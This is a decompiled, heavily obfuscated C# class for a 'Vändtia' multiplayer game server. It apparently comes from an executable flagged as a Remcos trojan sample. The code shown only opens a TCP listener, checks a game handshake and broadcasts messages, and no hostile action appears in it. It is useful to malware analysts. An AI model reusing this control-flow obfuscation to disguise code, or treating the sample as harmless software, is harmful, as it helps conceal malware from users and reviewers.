// Decompiled with JetBrains decompiler
// Type: Vändtia_Live_Server.Server
// Assembly: yDseEhTG5bnen4G, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4C5C9DF7-D67E-851A-F932-4F9F562A97E6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan.MSIL.Remcos.gen-a9fcf50b626f7a735761798ddff08a65e037fbde2ef6e57f066150543ebcb249.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;
using Vändtia_Live_Server.My;

namespace Vändtia_Live_Server
{
  public class Server
  {
    public int Port;
    public int SwitchingTime;
    public ArrayList Clients;
    public int Turn;
    private TcpListener Listener;
    private Thread Reciever;
    private bool Wait;

    public Server()
    {
label_4:
      int num1 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(11);
      int num2 = 26;
      while (true)
      {
        switch (num2 ^ 47)
        {
          case 50:
            goto label_4;
          case 51:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Server.CancelAll);
            num2 = 28;
            continue;
          case 52:
            switch (num1 + 53)
            {
              case 0:
                this.Clients = new ArrayList();
                num1 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(10);
                goto label_1;
              case 1:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Server.\uE9F9\uF20B\uF212\uF59B\uF3EE\uEC9E\uE5A1\uE78A\uEA90\uF194\uF3F1\uE30D);
                num1 = -2;
                goto label_1;
              case 2:
                this.Wait = true;
                num1 = -3;
                goto label_1;
              case 3:
                this.Reciever = new Thread(new ThreadStart(this.\uE9F9\uF20B\uF212\uF59B\uF3EE\uEC9E\uE5A1\uE78A\uEA90\uF194\uF3F1\uE30C));
                num1 = -1;
                goto label_1;
              case 4:
                goto label_8;
              default:
                num2 = 29;
                continue;
            }
          case 53:
label_1:
            num1 ^= 50;
            break;
        }
        num2 = 27;
      }
label_8:;
    }

    public event Server.OnNewClientEventHandler OnNewClient
    {
      add
      {
        Server.OnNewClientEventHandler clientEventHandler1 = this.OnNewClientEvent;
label_1:
        Server.OnNewClientEventHandler comparand = clientEventHandler1;
label_8:
        int num1 = 26;
        int num2 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(11);
        while (true)
        {
          switch ((num2 ^ 45) + 47)
          {
            case 0:
              RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Server.\uE9F9\uF20B\uF212\uF59B\uF3EE\uEC9E\uE5A1\uE78A\uEA90\uF194\uF3F1\uE30C);
              num2 = -4;
              continue;
            case 1:
              Server.OnNewClientEventHandler clientEventHandler2;
              switch (num1)
              {
                case 52:
                  RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Server.remove_OnNewClient);
                  num1 = 25;
                  goto label_2;
                case 53:
                  if (clientEventHandler1 == comparand)
                  {
                    num1 = 21;
                    goto label_2;
                  }
                  else
                    goto label_1;
                case 54:
                  clientEventHandler1 = Interlocked.CompareExchange<Server.OnNewClientEventHandler>(ref this.OnNewClientEvent, clientEventHandler2, comparand);
                  num1 = 24;
                  goto label_2;
                case 55:
                  clientEventHandler2 = comparand + value;
                  num1 = 27;
                  goto label_2;
                case 56:
                  goto label_9;
                default:
                  num2 = -2;
                  continue;
              }
            case 2:
              goto label_8;
            case 3:
label_2:
              num1 ^= 45;
              break;
          }
          num2 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(7);
        }
label_9:;
      }
      remove
      {
        Server.OnNewClientEventHandler clientEventHandler1 = this.OnNewClientEvent;
label_1:
        Server.OnNewClientEventHandler comparand = clientEventHandler1;
label_5:
        int num1 = 4;
        int num2 = 28;
        while (true)
        {
          switch (num2 ^ 51)
          {
            case 44:
              goto label_5;
            case 45:
              Server.OnNewClientEventHandler clientEventHandler2;
              switch (num1)
              {
                case 49:
                  clientEventHandler2 = comparand - value;
                  num1 = 6;
                  goto label_2;
                case 50:
                  RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Server.Send);
                  num1 = 7;
                  goto label_2;
                case 51:
                  clientEventHandler1 = Interlocked.CompareExchange<Server.OnNewClientEventHandler>(ref this.OnNewClientEvent, clientEventHandler2, comparand);
                  num1 = 1;
                  goto label_2;
                case 52:
                  if (clientEventHandler1 == comparand)
                  {
                    num1 = 0;
                    goto label_2;
                  }
                  else
                    goto label_1;
                case 53:
                  goto label_13;
                default:
                  num2 = 31;
                  continue;
              }
            case 46:
              RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Server.Send);
              num2 = 29;
              continue;
            case 47:
label_2:
              num1 ^= 53;
              break;
          }
          num2 = 30;
        }
label_13:;
      }
    }

    public void StartWaitForConnections()
    {
label_4:
      int num1 = VoteMenuForm.\uF1A2\uF27A\uE0B6\uF1B5\uF540\uE7E6\uE54C\uE056\uF550\uF103\uEC30\uE3AF(53);
      int num2 = -6;
      while (true)
      {
        switch ((num2 ^ 45) + 44)
        {
          case 0:
            goto label_4;
          case 1:
            IPHostEntry hostEntry;
            IPAddress localaddr;
            switch (num1 + 46)
            {
              case 0:
                num1 = -20;
                goto label_1;
              case 1:
                this.Reciever.Start();
                num1 = -26;
                goto label_1;
              case 2:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Server.\uE9F9\uF20B\uF212\uF59B\uF3EE\uEC9E\uE5A1\uE78A\uEA90\uF194\uF3F1\uE30D);
                num1 = -32;
                goto label_1;
              case 3:
                hostEntry = Dns.GetHostEntry(Dns.GetHostName());
                num1 = -30;
                goto label_1;
              case 4:
                localaddr = (IPAddress) hostEntry.AddressList.GetValue(2);
                num1 = -29;
                goto label_1;
              case 5:
                this.Listener = new TcpListener(localaddr, this.Port);
                num1 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(17);
                goto label_1;
              case 6:
                goto label_12;
              default:
                num2 = -7;
                continue;
            }
          case 2:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Server.EndWaitForConnections);
            num2 = VoteMenuForm.\uF1A2\uF27A\uE0B6\uF1B5\uF540\uE7E6\uE54C\uE056\uF550\uF103\uEC30\uE3AF(30);
            continue;
          case 3:
label_1:
            num1 ^= 52;
            break;
        }
        num2 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(5);
      }
label_12:;
    }

    private void \uE9F9\uF20B\uF212\uF59B\uF3EE\uEC9E\uE5A1\uE78A\uEA90\uF194\uF3F1\uE30C()
    {
      this.Listener.Start();
label_30:
      while (true)
      {
        try
        {
          Player1 player1 = new Player1();
label_3:
          int num1 = 6;
          object Left;
          bool flag;
          while (true)
          {
            switch (num1 ^ 50)
            {
              case 48:
                flag = Operators.ConditionalCompareObjectEqual(Left, (object) "game=Vändtia", false);
                num1 = 3;
                continue;
              case 49:
                if (flag)
                {
                  num1 = 4;
                  continue;
                }
                goto label_12;
              case 50:
                Left = (object) player1.Recieve();
                num1 = 2;
                continue;
              case 51:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Server.EndWaitForConnections);
                num1 = 1;
                continue;
              case 52:
                player1.Client = this.Listener.AcceptTcpClient();
                num1 = 7;
                continue;
              case 53:
                player1.Stream = player1.Client.GetStream();
                num1 = 0;
                continue;
              case 54:
                goto label_11;
              default:
                goto label_3;
            }
          }
label_11:
          int num2 = 0;
          goto label_13;
label_12:
          num2 = 1;
label_13:
          if (num2 == 0)
          {
            player1.Send("OK");
label_16:
            int num3 = 29;
            while (true)
            {
              switch (num3 ^ 48)
              {
                case 45:
                  num3 = 0;
                  continue;
                case 46:
                  Application.OpenForms[0].Invoke((Delegate) new MethodInvoker(this.\uE9F9\uF20B\uF212\uF59B\uF3EE\uEC9E\uE5A1\uE78A\uEA90\uF194\uF3F1\uE30D));
                  num3 = 1;
                  continue;
                case 47:
                  // ISSUE: method reference
                  RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Server.CancelAll);
                  num3 = 31;
                  continue;
                case 48:
                  this.Clients.Add((object) player1);
                  num3 = 30;
                  continue;
                case 49:
                  num3 = 2;
                  continue;
                case 50:
                  goto label_30;
                default:
                  goto label_16;
              }
            }
          }
          else if ((!Operators.ConditionalCompareObjectEqual(Left, (object) "<policy-file-request/>", false) ? 1 : 0) == 0)
          {
            player1.SendHandshake();
            Left = (object) player1.Recieve();
            if ((!Operators.ConditionalCompareObjectEqual(Left, (object) "game=Vändtia", false) ? 1 : 0) == 0)
            {
              player1.Send("OK");
            }
            else
            {
              player1.Send("wronggame");
              player1.Stream.Close();
            }
          }
          else
          {
            player1.Send("wronggame");
            player1.Stream.Close();
          }
        }
        catch (SocketException ex)
        {
          ProjectData.SetProjectError((Exception) ex);
          if ((ex.SocketErrorCode == SocketError.Interrupted ? 1 : 0) == 0)
            throw;
          else
            ProjectData.ClearProjectError();
        }
      }
    }

    public void EndWaitForConnections()
    {
label_4:
      int num1 = 30;
      int num2 = 24;
      while (true)
      {
        switch (num2 ^ 45)
        {
          case 50:
            goto label_4;
          case 51:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Server.add_OnNewClient);
            num2 = 30;
            continue;
          case 52:
            switch (num1)
            {
              case 48:
                num1 = 31;
                goto label_1;
              case 49:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Server.\uE9F9\uF20B\uF212\uF59B\uF3EE\uEC9E\uE5A1\uE78A\uEA90\uF194\uF3F1\uE30C);
                num1 = 29;
                goto label_1;
              case 50:
                this.Reciever.Abort();
                num1 = 28;
                goto label_1;
              case 51:
                this.Listener.Stop();
                num1 = 24;
                goto label_1;
              case 52:
                num1 = 25;
                goto label_1;
              case 53:
                goto label_11;
              default:
                num2 = 31;
                continue;
            }
          case 53:
label_1:
            num1 ^= 44;
            break;
        }
        num2 = 25;
      }
label_11:;
    }

    public void Send(string Text)
    {
      IEnumerator enumerator;
      try
      {
        enumerator = this.Clients.GetEnumerator();
label_13:
        while ((!enumerator.MoveNext() ? 0 : 1) != 0)
        {
          Player1 current = (Player1) enumerator.Current;
label_6:
          int num1 = 4;
          int num2 = 1;
          while (true)
          {
            switch (num2 ^ 53)
            {
              case 49:
                goto label_6;
              case 50:
                switch (num1)
                {
                  case 53:
                    num1 = 10;
                    goto label_3;
                  case 54:
                    current.Send(Text);
                    num1 = 7;
                    goto label_3;
                  case 55:
                    // ISSUE: method reference
                    RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Server.remove_OnNewClient);
                    num1 = 5;
                    goto label_3;
                  case 56:
                    goto label_13;
                  default:
                    num2 = 4;
                    continue;
                }
              case 51:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Server.CancelAll);
                num2 = 6;
                continue;
              case 52:
label_3:
                num1 ^= 50;
                break;
            }
            num2 = 7;
          }
        }
      }
      finally
      {
        if ((!(enumerator is IDisposable) ? 1 : 0) == 0)
          (enumerator as IDisposable).Dispose();
      }
    }

    public void CancelAll()
    {
      IEnumerator enumerator;
      try
      {
        enumerator = this.Clients.GetEnumerator();
        while ((!enumerator.MoveNext() ? 0 : 1) != 0)
        {
          Player1 current = (Player1) enumerator.Current;
          if ((!current.Client.Connected ? 1 : 0) == 0)
          {
            current.Client.Client.Shutdown(SocketShutdown.Both);
label_7:
            int num1 = 17;
            int num2 = -32;
            while (true)
            {
              switch ((num2 ^ 47) + 52)
              {
                case 0:
                  goto label_7;
                case 1:
                  switch (num1)
                  {
                    case 53:
                      // ISSUE: method reference
                      RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Server.\uE9F9\uF20B\uF212\uF59B\uF3EE\uEC9E\uE5A1\uE78A\uEA90\uF194\uF3F1\uE30D);
                      num1 = 24;
                      goto label_4;
                    case 54:
                      num1 = 16;
                      goto label_4;
                    case 55:
                      num1 = 23;
                      goto label_4;
                    case 56:
                      num1 = 20;
                      goto label_4;
                    case 57:
                      current.Client.Close();
                      num1 = 27;
                      goto label_4;
                    case 58:
                      current.Client.Client.Close();
                      num1 = 21;
                      goto label_4;
                    case 59:
                      current.Stream.Close();
                      num1 = 26;
                      goto label_4;
                    case 60:
                      num1 = 22;
                      goto label_4;
                    case 61:
                      goto label_19;
                    default:
                      num2 = -29;
                      continue;
                  }
                case 2:
                  // ISSUE: method reference
                  RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Server.add_OnNewClient);
                  num2 = -31;
                  continue;
                case 3:
label_4:
                  num1 ^= 45;
                  break;
              }
              num2 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(19);
            }
          }
label_19:;
        }
      }
      finally
      {
        if ((!(enumerator is IDisposable) ? 1 : 0) == 0)
          (enumerator as IDisposable).Dispose();
      }
    }

    private void \uE9F9\uF20B\uF212\uF59B\uF3EE\uEC9E\uE5A1\uE78A\uEA90\uF194\uF3F1\uE30D()
    {
      // ISSUE: reference to a compiler-generated field
      Server.OnNewClientEventHandler onNewClientEvent = this.OnNewClientEvent;
      if ((onNewClientEvent == null ? 1 : 0) != 0)
        return;
      Server.OnNewClientEventHandler clientEventHandler = onNewClientEvent;
      ArrayList clients;
      int index;
      Player1 player1 = (Player1) (clients = this.Clients)[index = checked (this.Clients.Count - 1)];
      ref Player1 local = ref player1;
      clientEventHandler(ref local);
label_6:
      int num1 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(5);
      int num2 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(11);
      while (true)
      {
        switch ((num2 ^ 44) + 46)
        {
          case 0:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Server.CancelAll);
            num2 = -2;
            continue;
          case 1:
            goto label_6;
          case 2:
            switch (num1 + 45)
            {
              case 0:
                clients[index] = (object) player1;
                num1 = -5;
                goto label_2;
              case 1:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Server.Send);
                num1 = -7;
                goto label_2;
              case 2:
                num1 = -2;
                goto label_2;
              case 3:
                goto label_13;
              default:
                num2 = -1;
                continue;
            }
          case 3:
label_2:
            num1 ^= 45;
            break;
        }
        num2 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(5);
      }
label_13:;
    }

    public delegate void OnNewClientEventHandler(ref Player1 Client);
  }
}
